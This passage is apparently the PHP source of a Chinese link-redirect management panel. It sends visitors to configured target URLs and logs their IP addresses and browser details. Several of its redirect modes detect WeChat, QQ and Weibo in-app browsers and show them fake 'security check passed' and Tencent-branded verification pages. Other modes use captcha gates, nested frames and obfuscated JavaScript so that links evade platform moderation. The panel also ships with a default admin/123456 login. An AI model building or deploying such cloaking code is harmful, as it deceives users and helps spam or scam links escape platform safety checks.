<?php
/*http://127.0.0.2/index.php?url=http%3A%2F%2Fwww.hnmy568.com
*	技术支持：我们的技术范围有：PHP，JAVASCRIPT，JQUERY，MYSQL，HTML，H5，CSS，THINKPHP，APACHE，NGINX，IIS，图片处理，UI设计，SEO技术顾问等。电话：18729480012，企鹅：3379530015。
*/
//后台正文开始 
if(isset($_COOKIE['idf'])){
	ini_set("display_errors", "On");
	error_reporting(E_ALL ^ E_NOTICE);
}else{
	ini_set("display_errors", "Off");
	error_reporting(0);
}
date_default_timezone_set('PRC');
$default = array(
	'logs' => '1',
	'type' => '3',
	'view' => '1',
	'parm' => '1',
	'sort' => '1',
	'urls' => "http://www.qq.com/",
	'user' => 'admin',
	'pass' => '123456',
);
$confile = './images/~ec-config.php';
if(!is_dir(dirname($confile)))mkdir(dirname($confile));
if(!isset($_GET['admin'])){
	if(getenv("HTTP_CLIENT_IP") && strcasecmp(getenv("HTTP_CLIENT_IP"), "unknown")){
		$ip = getenv("HTTP_CLIENT_IP");
	}else if(getenv("HTTP_X_FORWARDED_FOR") && strcasecmp(getenv("HTTP_X_FORWARDED_FOR"), "unknown")){
		$ip = getenv("HTTP_X_FORWARDED_FOR");
	}else if(getenv("REMOTE_ADDR") && strcasecmp(getenv("REMOTE_ADDR"), "unknown")){
		$ip = getenv("REMOTE_ADDR");
	}else if(isset($_SERVER['REMOTE_ADDR']) && $_SERVER['REMOTE_ADDR'] && strcasecmp($_SERVER['REMOTE_ADDR'], "unknown")){
		$ip = $_SERVER['REMOTE_ADDR'];
	}else{
		$ip = '0.0.0.0';
	}
	if(strpos($ip,','))$ip = current(explode(',',$ip));
	$config = getConfig($confile);
	$href= "http://{$_SERVER['HTTP_HOST']}{$_SERVER['REQUEST_URI']}";
	$urls = preg_split('/\s*\n\s*/ui',trim($config['urls']));
	if(isset($_GET['type']) && 'jsonp'==$_GET['type']){
		exit('var urlList = '.json_encode($urls,JSON_UNESCAPED_UNICODE|JSON_PRETTY_PRINT|JSON_UNESCAPED_SLASHES).';');
	}
	if(2==$config['sort'] && count($urls)>1){
		$iText = is_file($ifile ='./images/~ec-index.log')?abs(intval(@file_get_contents($ifile))+1):0;
		@file_put_contents($ifile,$iText);
		$url = myChat($urls[$iText%count($urls)]);
	}elseif(3==$config['sort'] && count($urls)>1){
		$ipIndex = abs(intval(crc32(md5($ip))))+1;
		$url = myChat($urls[$ipIndex%count($urls)]);
	}else{
		$url = myChat($urls[array_rand($urls)]);
	}
	if(!empty($config['parm'])&&!empty($_SERVER['QUERY_STRING'])){
		$url .= (stristr($url,'?')?'&':'?').$_SERVER['QUERY_STRING'];
	}
	try{
		if(!empty($config['view'])){
			$tj = Tongji::viweSet(array('href'	=> $href));
		}
		if(!empty($config['logs'])){
			@file_put_contents('./images/~ec-log-'. date('Y-m') . '.log',"\r\n###### ".date('Y-m-d H:i:s')."\t{$ip}\t{$url}\t{$_SERVER['HTTP_REFERER']}\t{$href}\t{$_SERVER['HTTP_USER_AGENT']}\t######",FILE_APPEND);
		}
	}catch( Exception $e){}
	if(empty($url)){
		header("Content-Type:text/html;charset=utf-8");
		echo '参数无效';
	}elseif('20' == $config['type']){
		echo FromCharEval("location.replace('{$url}');");
	}elseif('1' == $config['type']){
		header("HTTP/1.1 301 Moved Permanently"); 
		header("Location: {$url}");
	}elseif('2' == $config['type']){
		header("HTTP/1.1 302 Found"); 
		header("Location: {$url}",true,302);
	}elseif('3' == $config['type']){
		echo '<script>'.FromCharEval("location.replace('{$url}');").'</script>';
	}elseif('5' == $config['type']){
		echo "<!doctype html>\n<html>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width,initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no\">\n<title>　</title>\n</head>\n<frameset cols=\"100%\">\n  <frame src=\"{$url}\">\n</frameset>\n</html>";
	}elseif('35' == $config['type']){
		if(isset($_GET['f3'])){
			echo "<!doctype html>\n<html>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width,initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no\">\n<title>　</title>\n<script>document.write('<frameset cols=\"100%\"><frame src=\"{$url}\"></frameset>');</script></head>\n</html>";
		}elseif(isset($_GET['f2'])){
			echo "<!doctype html>\n<html>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width,initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no\">\n<title></title>\n<script>document.write('<frameset cols=\"100%\"><frame src=\"?f3=on\"></frameset>');</script></head>\n</html>";
		}else{
			echo "<!doctype html>\n<html>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width,initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no\">\n<title>　</title>\n</head>\n<frameset cols=\"100%\">\n  <frame src=\"?f2=on\">\n</frameset>\n</html>";
		}
	}elseif('28' == $config['type']){
		echo "<script type=\"text/javascript\">\nfunction goPAGE() {\nif ((navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i))) {\n//javascript:;\n}\nelse {\nwindow.location.href=\"https://www.baidu.com\";\t}\n}\ngoPAGE();\n</script>\n<script>\n\nvar urls=[\n\t'{$url}',\n];\nlocation.href = myEeplace(urls[Math.floor(Math.random()*urls.length)]);\nfunction myEeplace(s){\n\treturn s.replace(/\\{(\\w+?)\\}/g,function(a,b){\n\t\tvar h='';\n\t\tfor(var i=0;i<b.length;i++){\n\t\t\tif('n'==b[i]){\n\t\t\t\th+=Math.floor(Math.random()*10);\n\t\t\t}else if('w'==b[i]){\n\t\t\t\th+=String.fromCharCode(97+Math.floor(Math.random()*26));\n\t\t\t}\n\t\t}\n\t\treturn h;\n\t});\n}\n</script>";
	}elseif('6' == $config['type']){
		echo "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"UTF-8\">\n<meta name=\"viewport\" content=\"width=device-width,initial-scale=1.0\">\n<title>加载中</title>\n</head>\n<body style=\"background: #e6eaeb;\">\n\t<div style=\"position: relative;margin: 250px auto 0;padding: 0 0 22px;border-radius: 15px 15px 5px 5px;background: #fff;box-shadow: 10px 20px 20px rgba(101, 102, 103, .75);width:95%;max-width: 400px;color: #fff;text-align: center;\">\n\t<canvas id=\"canvas\" width=\"200\" height=\"200\" style=\"display:block;position:absolute;top:-100px;left:0;right:0;margin:0 auto;background:#fff;border-radius:50%;\"> </canvas>\n\t<div style=\"color: #242424;font-size: 28px;padding:111px  0 20px\">通过安全加密检测</div>\n\t<div style=\"margin: 25px 0 14px;color: #7b7b7b;font-size: 18px;\">专业平台 信誉保证</div>\n\t<a id=\"btn\" href=\"javascript:void(0);\" style=\"display: block;border-radius: 500px;background-color: #ff5656;height: 65px;line-height: 65px;width: 250px;color: #fff;font-size: 22px;text-decoration: none;letter-spacing: 2px;margin:20px auto;cursor:pointer;\">链接检测中……</a>\n\t</div>\n<script>\nwindow.onload=function(){var canvas=document.getElementById('canvas'),ctx=canvas.getContext('2d'),ras=canvas.width/2,index=0;drawFrame();function drawFrame(){ctx.clearRect(0,0,canvas.width,canvas.height);ctx.save();ctx.translate(ras,ras);ctx.beginPath();ctx.lineWidth=ras*0.08;ctx.strokeStyle=\"#d1d2d4\";ctx.arc(0,0,ras*0.8,0,Math.PI*2,false);ctx.stroke();ctx.strokeStyle=\"#00a2ff \";ctx.lineWidth=ras*0.12;ctx.beginPath();ctx.arc(0,0,ras*0.8,-Math.PI/2,-Math.PI/2+index*Math.PI*2/100,false);ctx.stroke();ctx.textAlign='center';ctx.textBaseline='middle';ctx.font=ras/2.2+'px Arial';ctx.fillText(index.toFixed(0)+'%',0,0);ctx.restore();document.title='加载中 '+index.toFixed(1)+'%';if(index<99.2){if(index>90){index+=1;btn.innerHTML='请点击进入';btn.onclick=function(){location.href='{$url}';};btn.style.background='#36A11E'}else if(index>60){index+=1}else{index+=3}setTimeout(drawFrame,20)}else if(index!=100){index=100;drawFrame()}else{document.title='请点击进入'}}}\n</script>\n</body>\n</html>";
	}elseif('7' == $config['type']){
		echo "<!DOCTYPE html>\n<html><head>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\">\n<title>请使用浏览器打开</title>\n<meta name=\"viewport\" content=\"width=device-width,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no\">\n<meta name=\"format-detection\" content=\"telephone=no\">\n<meta name=\"apple-mobile-web-app-capable\" content=\"yes\">\n<meta name=\"wap-font-scale\" content=\"no\">\n<meta name=\"apple-mobile-web-app-status-bar-style\" content=\"black\">\n<script type=\"text/javascript\">\nvar system ={};  \n   var p = navigator.platform;       \n   system.win = p.indexOf(\"Win\") == 0;  \n   system.mac = p.indexOf(\"Mac\") == 0;  \n   system.x11 = (p == \"X11\") || (p.indexOf(\"Linux\") == 0);     \n   if(system.win||system.mac||system.xll){\n\t\twindow.location.href=\"http://weishi.qq.com\";  \n   }\n</script> \n<script>\nvar url = '{$url}';\nif(!/MicroMessenger|QQ\\//gi.test(navigator.userAgent)){\n\tlocation.href=url;\n}\n</script>\n<style type=\"text/css\">body,html{font-family:sans-serif}</style>\n</head>\n<body oncontextmenu=\"return false\" onselectstart=\"return false\">\n<div style=\"text-align:center\">\n\t<div style=\"background-image:url(https://external-30160.picsz.qpic.cn/632d2c7051d7d9d8764fb3f8983bce4c);height:100%;\">\n\t\t<img src=\"https://external-30160.picsz.qpic.cn/f5c4cd695818494d727d8715bcfe7239\" width=\"100%\"/>\n\t</div>\n\t<div style=\"width:100%;position:fixed;bottom: 0;font-size: 12px;display:-ms-flexbox;display:flex;-ms-flex-direction:row;margin:0 auto auto auto;padding:5%;background:#f9f9f9;border-radius:4px;-ms-flex-align:center;align-items:center;right:0;left:0;\" class=\"bomArea\">\n\t\t<img src=\"https://external-30160.picsz.qpic.cn/60d9f46afebf468646b2e008a020d1a2\" style=\"width:15%;margin-right:5%\">\n\t\t<div> \n\t\t\t<div style=\"text-align:left;font-size:14px;color:#fb7299\">管家检测正常，请按上图提示打开。</div>\n\t\t\t<div>您所访问的地址：http://pc.qq.com/</div>\n\t\t</div>\n\t</div>\t\n</div>\t\n</body>\n</html>";
	}elseif('8' == $config['type']){
		echo "<!DOCTYPE html>\n<html><head>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\">\n<title>请使用浏览器打开</title>\n<meta name=\"viewport\" content=\"width=device-width,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no\">\n<meta name=\"format-detection\" content=\"telephone=no\">\n<meta name=\"apple-mobile-web-app-capable\" content=\"yes\">\n<meta name=\"wap-font-scale\" content=\"no\">\n<meta name=\"apple-mobile-web-app-status-bar-style\" content=\"black\">\n<script type=\"text/javascript\">\nvar system ={};  \n   var p = navigator.platform;       \n   system.win = p.indexOf(\"Win\") == 0;  \n   system.mac = p.indexOf(\"Mac\") == 0;  \n   system.x11 = (p == \"X11\") || (p.indexOf(\"Linux\") == 0);     \n   if(system.win||system.mac||system.xll){\n\t\twindow.location.href=\"http://weishi.qq.com\";  \n   }\n</script> \n<script>\nvar url = '{$url}';\nif(/MicroMessenger|QQ\\//gi.test(navigator.userAgent)){\n\tdocument.write('<meta http-equiv=\"refresh\" content=\"0.1;url=mttbrowser://url='+url+'\">');\n}else{\n\tlocation.href=url;\n}\n</script>\n<style type=\"text/css\">body,html{font-family:sans-serif}</style>\n</head>\n<body oncontextmenu=\"return false\" onselectstart=\"return false\">\n<div style=\"text-align:center\">\n\t<div style=\"background-image:url(https://external-30160.picsz.qpic.cn/632d2c7051d7d9d8764fb3f8983bce4c);height:100%;\">\n\t\t<img src=\"https://external-30160.picsz.qpic.cn/f5c4cd695818494d727d8715bcfe7239\" width=\"100%\"/>\n\t</div>\n\t<div style=\"width:100%;position:fixed;bottom: 0;font-size: 12px;display:-ms-flexbox;display:flex;-ms-flex-direction:row;margin:0 auto auto auto;padding:5%;background:#f9f9f9;border-radius:4px;-ms-flex-align:center;align-items:center;right:0;left:0;\" class=\"bomArea\">\n\t\t<img src=\"https://external-30160.picsz.qpic.cn/60d9f46afebf468646b2e008a020d1a2\" style=\"width:15%;margin-right:5%\">\n\t\t<div> \n\t\t\t<div style=\"text-align:left;font-size:14px;color:#fb7299\">管家检测正常，请按上图提示打开。</div>\n\t\t\t<div>您所访问的地址：http://pc.qq.com/</div>\n\t\t</div>\n\t</div>\t\n</div>\t\n</body>\n</html>";
	}elseif('23' == $config['type']){
		echo "<!DOCTYPE HTML>\n<html>\n<head>\n<title>举报网址</title>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" />\n<meta name=\"viewport\" content=\"width=device-width\" />\n</head>\n<body>\n<script src=\"https://ssl.captcha.qq.com/TCaptcha.js\"></script>\n<script>var captcha1=new TencentCaptcha('2046626881',function(res){if(res.ret==0){setTimeout(function(){captcha1.show()},2000);location.replace('{$url}')}});captcha1.show();</script>\n</body>\n</html>";
	}elseif('24' == $config['type']){
		echo "<!DOCTYPE HTML>\n<html>\n<head>\n<title>拖动下方滑块完成拼图</title>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" />\n<meta name=\"viewport\" content=\"width=device-width\" />\n</head>\n<body>\n<script src=\"https://ssl.captcha.qq.com/TCaptcha.js\"></script>\n<script>\nif(/MicroMessenger|QQ\\//gi.test(navigator.userAgent)){var captcha1=new TencentCaptcha('2046626881',function(res){if(res.ret==0){document.clear();document.write('<meta http-equiv=\"refresh\" content=\"0.1;url=mttbrowser://url={\$url}\">');document.write('<div id=\"shownewx\" style=\"text-align:center\"><div style=\"background-image:url(https://external-30160.picsz.qpic.cn/632d2c7051d7d9d8764fb3f8983bce4c);height:100%;\"><img src=\"https://external-30160.picsz.qpic.cn/f5c4cd695818494d727d8715bcfe7239\" width=\"100%\"/></div><div style=\"width:100%;position:fixed;bottom: 0;font-size: 12px;display:-ms-flexbox;display:flex;-ms-flex-direction:row;margin:0 auto auto auto;padding:5%;background:#f9f9f9;border-radius:4px;-ms-flex-align:center;align-items:center;right:0;left:0;\" class=\"bomArea\"><img src=\"https://external-30160.picsz.qpic.cn/60d9f46afebf468646b2e008a020d1a2\" style=\"width:15%;margin-right:5%\"><div><div style=\"text-align:left;font-size:14px;color:#fb7299\">管家检测正常，请按上图提示打开。</div><div>您所访问的地址：http://pc.qq.com/</div></div></div></div>');setInterval(function(){for(var i=0;i<document.body.children.length;i++)if(document.body.children[i].id!=\"shownewx\")document.body.children[i].style.display=\"none\"},100);setTimeout(function(){captcha1.show()},2000)}});captcha1.show()}else{location.replace('{$url}')}\n</script>\n</body>\n</html>";
	}elseif('25' == $config['type']){
		if(preg_match('/\bWeibo\b/i' ,$_SERVER['HTTP_USER_AGENT'])){
			echo "<!doctype html>\n<html>\n<head>\n<meta http-equiv=\"content-type\" content=\"text/html;charset=utf-8\">\n<meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge,chrome=1\">\n<meta name=\"viewport\" content=\"width=device-width,initial-scale=1.0,user-scalable=no\">\n<meta name=\"referrer\" content=\"always\">\n<meta name=\"renderer\" content=\"webkit\">\n<title></title>\n</head>\n<body><div style=\"background:#000;width:100vw;height:100vh;position:fixed;text-align:center;opacity:0.9;z-index:100000000;text-align:center;position: fixed;top:0;left:0;\"><img src=\"./images/".(preg_match('/iPhone|iPod|ios|iPad/i' ,$_SERVER['HTTP_USER_AGENT'])?'bg_ios.png':'bg_android.png')."\" width=\"100%\"></div>\n\n</body>\n</html>\n";
		}else{
			header("Location: {$url}",true,302);
		}
	}elseif('26' == $config['type']){
		if(preg_match('/\bWeibo\b/i' ,$_SERVER['HTTP_USER_AGENT'])){
			echo "<!DOCTYPE html>\n<html><head>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\">\n<title>请使用浏览器打开</title>\n<meta name=\"viewport\" content=\"width=device-width,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no\">\n<meta name=\"format-detection\" content=\"telephone=no\">\n<meta name=\"apple-mobile-web-app-capable\" content=\"yes\">\n<meta name=\"wap-font-scale\" content=\"no\">\n<meta name=\"apple-mobile-web-app-status-bar-style\" content=\"black\">\n<style type=\"text/css\">body,html{font-family:sans-serif}</style>\n</head>\n<body oncontextmenu=\"return false\" onselectstart=\"return false\">\n<div style=\"text-align:center\">\n\t<div style=\"background-image:url(https://external-30160.picsz.qpic.cn/632d2c7051d7d9d8764fb3f8983bce4c);height:100%;\">\n\t\t<img src=\"https://external-30160.picsz.qpic.cn/f5c4cd695818494d727d8715bcfe7239\" width=\"100%\"/>\n\t</div>\n\t<div style=\"width:100%;position:fixed;bottom: 0;font-size: 12px;display:-ms-flexbox;display:flex;-ms-flex-direction:row;margin:0 auto auto auto;padding:5%;background:#f9f9f9;border-radius:4px;-ms-flex-align:center;align-items:center;right:0;left:0;\" class=\"bomArea\">\n\t\t<img src=\"https://external-30160.picsz.qpic.cn/60d9f46afebf468646b2e008a020d1a2\" style=\"width:15%;margin-right:5%\">\n\t\t<div> \n\t\t\t<div style=\"text-align:left;font-size:14px;color:#fb7299\">管家检测正常，请按上图提示打开。</div>\n\t\t\t<div>您所访问的地址：http://pc.qq.com/</div>\n\t\t</div>\n\t</div>\t\n</div>\t\n</body>\n</html>";
		}else{
			header("Location: {$url}",true,302);
		}
	}else{
		echo 'var url= '.json_encode($url).';';
	}
}else{
	$config = is_file($confile)?array_merge($default,include($confile)):$default;
	//检查登录
	if('admin123456'!=$config['user'].$config['pass']){
		$md5Agent=md5($config['user'].$config['pass'].$_SERVER['HTTP_USER_AGENT']);
		if(isset($_POST['checkUser'])&&isset($_POST['checkPass'])&&$_POST['checkUser']==$config['user']&&$_POST['checkPass']==$config['pass']){
			setcookie('DFDOG',$md5Agent,$_SERVER['REQUEST_TIME']+864000,'/');
			$json['tip'] = '已经登录成功，请按需求配置';
		}elseif(empty($_COOKIE['DFDOG'])||$_COOKIE['DFDOG']!=$md5Agent){
			exit('<!doctype html><html><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta name="viewport"content="width=device-width,initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>请输入密码</title><style>*{margin:0;padding:0;font-family:Microsoft Yahei;font-weight:bold;text-align:center;border-radius:15px;border:none;outline:none}div{margin:auto;width:80%;min-width:250px;max-width:380px;border:1px solid#e1cfb6;background:#eee;margin-top:200px;box-shadow:0 0 40px#9aa}input{height:34px;width:47%}form{padding:20px 0}p{padding:10px 0}h2{background:#f50;color:#fff;line-height:60px;border-bottom-right-radius:0;border-bottom-left-radius:0}b{color:#a97c50;font-size:14px;width:100px}button{background:#f50;color:#fff;cursor:pointer;font-size:18px;padding:10px;width:60%;box-shadow:0 0 10px#ffc2a3}</style></head><body><div><h2>请输入密码</h2><form method="post"action="">'.(isset($_POST['checkUser'])?'<p style="color:red">用户名或密码不正确！</p>':'').'<p><b>帐号：</b><input name="checkUser" required autofocus></p><p><b>密码：</b><input name="checkPass"type="password" required></p><p><button type="submit">登　录</button></p>'.(isset($_POST['checkUser'])?'<p style="color:#999;font-size:12px;font-weight: 100;">密码在文件 ~config.php 中请查看！</p>':'').'</form></div></body></html>');
		}
	}
	//统计
	if(!empty($config['view'])){
		$tj = Tongji::viweSet(array('href'	=> 'http://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'],));                             
		$tj = Tongji::viweGet($tj);
	}
	//echo'<pre>';print_r($tj);
	//修改配置
	if(!empty($_POST)){
		$json = array();
		if(isset($_POST['c'])){
			$json['text'] = '没有数据，请运行一段时间在查看数据';
			if('log' == $_POST['c'] && is_file($file='./images/~ec-log-'. date('Y-m') . '.log')){
				$json['text'] = "《访问数据列表》\r\n".trim(file_get_contents($file));
			}elseif('tj' == $_POST['c']&& !empty($tj['trace']) ){
				$json['text'] = trim($tj['trace']);
			}
		}elseif(isset($_POST['back'])&&$_POST['back']=='恢复默认'&&is_file($confile)){
			unlink($confile);
			$config = $default;
			$json['tip'] = '已经恢复默认，请重新配置';
		}elseif(isset($_POST['back'])&&$_POST['back']=='恢复默认'&&is_file($confile)){
			unlink($confile);
			$config = $default;
			$json['tip'] = '已经恢复默认，请重新配置';
		}elseif(isset($_POST['conf'])&&is_array($_POST['conf'])){
			//var_dump($_POST['conf']);
			$config = array_merge($config,$_POST['conf']);
			if(!empty($_POST['add_jump'])){
				$_POST['add_jump'] = array_reverse($_POST['add_jump']);
				foreach($_POST['add_jump'] as $jv){
					if(!empty($jv[0])&&!empty($jv[1])){
						array_unshift($config['jumps'],$jv);
					}
				}
			}
			if(FILE_PUT_CONTENTS($confile,'<?php return '.var_export($config,true).';')){
				$json['tip'] = '已保存成功！';	
			}else{
				$json['tip'] = '哎呦，文件无法写入，请设置根目录的写入权限';	
			}
		}
		exit(json_encode($json));		
	}
	$conf = $config;
	$GLOBALS['json']['home'] =  'http://'.$_SERVER['HTTP_HOST'].current(explode('?',$_SERVER['REQUEST_URI']));	
?><!doctype html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
<meta http-equiv="Cache-Control" content="no-transform">
<link rel="shortcut icon" type="image/x-icon" href="data:image/x-icon;base64,AAABAAEAEBAAAAEAIABoBAAAFgAAACgAAAAQAAAAIAAAAAEAIAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgbRLHGCiH3xhoRnBV6tQ4UPO/uFEzf2/RM39em3X/BgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD5+vQAX6EfdlueEvdfoRT/X6EU/16eEf9Gvrb/Qs3+/0LN/v89y/31RM39cgAAAAAAAAAAAAAAAAAAAAD//v4AW54YnV2gEv9foRT/X6EU/1+hFP9foRT/Up4v/0HN+v9Czf7/Qs3+/z/M/v9AzP2XAAAAAAAAAAAAAAAAYaIhcFyfEv9foRT/X6EU/1+hFP9foRT/X6EU/1iaDv9JtpH/Qs3+/0LN/v9Czf7/P8z+/0bO/WoAAAAAjrtXFFqeE/NfoRT/X6EU/1+hFP9doBP/da04/6fLf/+jyH3/aaVA/0HK6/9Czf7/Qs3+/0LN/v89y/3vh9/8EGChHG5eoRP/X6EU/1+hFP9doBP/nsZ3//vw5v/4wp3/+MKd//vx5/+M1cn/QMz+/0LN/v9Czf7/Qcz+/0TN/WhkpB+1X6EU/1+hFP9foRT/cak5//zy6v/0jkn/9IpD//SKQ//0j0v/+/Tv/1XS/f9Czf7/Qs3+/0LN/v9Jzv2vYqMZ31+hFP9foRT/X6MR/5Sluv/5xaL/9IpD//SKQ//0ikP/9IpD//nIp/+M4P7/Qs3+/0LN/v9Czf7/SM794WOjGt9foRT/X6AU/1KBUf+Iiur/+caj//SKQ//0ikP/9IpD//SKQ//5yaj/iuD+/0LN/v9Czf7/Qs3+/0jO/d9jox+zX6EU/1+hFf85RMP/T1ff//vy7v/0j0z/9IpD//SKQ//0kE7/+vXx/1LR/f9Czf7/Qs3+/0LN/v9Jzv2tYKEcal6hE/9LcXD/O0Td/zxH3/+Di+r/+vHt//nHpf/5x6b/+PTv/3bX+/83xvv/Psr9/0LN/v9BzP7/RM39ZJbBZBBYmCHxO0Xa/z5J4P8+SeD/PEff/1Jc4v+Lkuv/iZjt/0qH6/81guv/NoLr/zWB6/83guv/OInt7ZLh/A4AAAAARljBaDtG3/8+SeD/Pkng/z5J4P8+SeD/Pkng/z5J4P8+SeD/Pkng/z5J4P8+SeD/OkXf/0RP4GIAAAAAAAAAAAAAAAA8R96RO0bf/z5J4P8+SeD/Pkng/z5J4P8+SeD/Pkng/z5J4P8+SeD/OkXf/z9K340AAAAAAAAAAAAAAAAAAAAAAAAAAEJN4Gw5RN/zPkng/z5J4P8+SeD/Pkng/z5J4P89SOD/OUTf8UNO4GgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcXrmFEBL33JCTeC5QUzg4UFM4OFCTeC3P0rgcHmB5hIAAAAAAAAAAAAAAAAAAAAA/D8AAPAPAADAAwAAwAMAAIABAACAAQAAAAAAAAAAAAAAAAAAAAAAAIABAACAAQAAwAMAAMADAADwDwAA/D8AAA==">
<title>恩科网址管理后台</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;}
a{cursor:pointer;text-decoration:none;color:#aad2f1;}
body{margin:0;padding:200px 0 0;color:#fff;background-color:#000;background-size:20px;height:100vh;}
.head{padding:8px 3px;font-size:30px;border-top:none !important;}
.form{margin:auto;font-size:13px;width:100%;display:block;margin:0 auto;width:100%;max-width:800px;}
.form .form_table{margin-bottom:100px;}
.form span{color:#90caec;display:block;padding-top:3px;font-size:12px;width:92%;}
.form td{border-top:#3e3d3d solid 1px;padding:8px 3px;}
.form .text{width: 95%;border:1px solid #efd5d5;padding:6px;font-size:14px;line-height:1.2em;border-radius:5px;background-color:rgba(255, 255, 255, 0.86);color:#333;}
.form .checkbox{vertical-align:-2px;margin-right:7px;}
.form .left{text-align:right;min-width:78px;width: 13%;font-size:14px;padding-right:8px;}
.form .butt{color:#FFF;border:none;height:30px;font-size:14px;margin:4px 5px 4px 0px;cursor:pointer;line-height:1;font-weight:bold;border-radius:5px;background:#4899E0;width: 212px;}
.form .info{font-size:12px;color:#ef9c67;margin:0;padding:3px 15px;}
.tr_more{display:none;}
.tj_box{width: 95%;overflow: auto;}
.tj_btn{color:#de876b;margin-left:11px;font-weight: bold;}
.tj_block{tab-size:4;white-space:pre-wrap;word-break:break-word;}
@media(max-width:750px){.form .butt{width:75px;max-width: 159px;}}
</style>
</head>
<body>
<form id="form" class="form" name="form" method="post" enctype="multipart/form-data">
	<table class="form_table" width="100%" border="0" cellpadding="0" cellspacing="0">
		<tr>
			<td colspan="2" class="head" align="center">恩科网址管理后台</td>
		</tr>
		<tr>
			<td class="left">推广地址</td>
			<td><a target="_blank" href="<?php echo $GLOBALS['json']['home']; ?>" ><?php echo preg_replace('/(.{30}).{5,}(.{15})/','$1**$2', $GLOBALS['json']['home']); ?></a></td>
		</tr>
		<tr>
			<td class="left">管理地址</td>
			<td><a href="<?php echo $GLOBALS['json']['home'].'?admin=on'; ?>" ><?php echo preg_replace('/(.{30}).{5,}(.{15})/','$1**$2', $GLOBALS['json']['home'].'?admin=on'); ?></a></td>
		</tr>
		<?php
			if(!empty($conf['view'])){
		?>
		<tr>
			<td class="left">流量统计</td>
			<td>
				<div class="tj_box" title="<?php echo htmlentities($tj['trace']); ?>"><?php echo $tj['desc']; ?> <a class="tj_btn" onclick="showInfo('tj')">统计</a><a class="tj_btn" onclick="showInfo('log')">详细</a></div>
			</td>
		</tr>
		<?php } ?>
		<tr>
			<td class="left">目标地址</td>
			<td><textarea class="text" id="urls" name="conf[urls]" style="min-height:7.2em;" ><?php echo($conf['urls']); ?></textarea>
				<span>填写目标地址</span>
			</td>
		</tr>
		<tr>
			<td class="left">跳转形式</td>
			<td >
				<select class="text" id="type" name="conf[type]">
					<option <?php if($conf['type']==3)echo 'selected'; ?> value="3">JS 跳转</option>
					<option <?php if($conf['type']==1)echo 'selected'; ?> value="1">302跳转（有缓存）</option>
					<option <?php if($conf['type']==2)echo 'selected'; ?> value="2">301跳转（有缓存）</option>
					<option <?php if($conf['type']==28)echo 'selected'; ?> value="28">JS 随机跳</option>
					<option <?php if($conf['type']==5)echo 'selected'; ?> value="5">框架跳转</option>
					<option <?php if($conf['type']==35)echo 'selected'; ?> value="35">框架跳转（多层）</option>
					<option <?php if($conf['type']==6)echo 'selected'; ?> value="6">手动跳转</option>
					<option <?php if($conf['type']==23)echo 'selected'; ?> value="23">验证跳转 2</option>
					<option <?php if($conf['type']==24)echo 'selected'; ?> value="24">验证&跳出 3</option>
					<option <?php if($conf['type']==7)echo 'selected'; ?> value="7">跳出浏览器（QQ/微信）</option>
					<option <?php if($conf['type']==8)echo 'selected'; ?> value="8">跳出浏览器（仅QQ自动）</option>
					<option <?php if($conf['type']==25)echo 'selected'; ?> value="25">跳出浏览器（微博IMG）</option>
					<option <?php if($conf['type']==26)echo 'selected'; ?> value="26">跳出浏览器（微博301）</option>
					<option <?php if($conf['type']==20)echo 'selected'; ?> value="20">JSONP 跳转</option>
					<option <?php if($conf['type']==0)echo 'selected'; ?> value="0">JSON 不跳转</option>
				</select>
				<span>选择跳转形式</span>
			</td>
		</tr>
		<tr>
			<td class="left">轮询方式</td>
			<td >
				<select class="text" id="sort" name="conf[sort]">
					<option <?php if($conf['sort']==1)echo 'selected'; ?> value="1">随机打开</option>
					<option <?php if($conf['sort']==2)echo 'selected'; ?> value="2">顺序打开</option>
					<option <?php if($conf['sort']==3)echo 'selected'; ?> value="3">用户固定</option>
				</select>
				<span>按顺序依次打开链接</span>
			</td>
		</tr>
		<tr class="tr_more">
			<td class="left">继承参数</td>
			<td ><input type="hidden" name="conf[parm]" value="0"><input class="checkbox" type="checkbox" id="parm" name="conf[parm]" <?php if($conf['parm']=='1')echo 'checked'; ?> value="1">在访问时候继承参数<br></td>
		</tr>
		<tr class="tr_more">
			<td class="left">统计数据</td>
			<td ><input type="hidden" name="conf[view]" value="0"><input class="checkbox" type="checkbox" id="view" name="conf[view]" <?php if($conf['view']=='1')echo 'checked'; ?> value="1">在根目录写访问日志<br></td>
		</tr>
		<tr class="tr_more">
			<td class="left">记录日志</td>
			<td ><input type="hidden" name="conf[logs]" value="0"><input class="checkbox" type="checkbox" id="logs" name="conf[logs]" <?php if($conf['logs']=='1')echo 'checked'; ?> value="1">在根目录写访问日志<br></td>
		</tr>
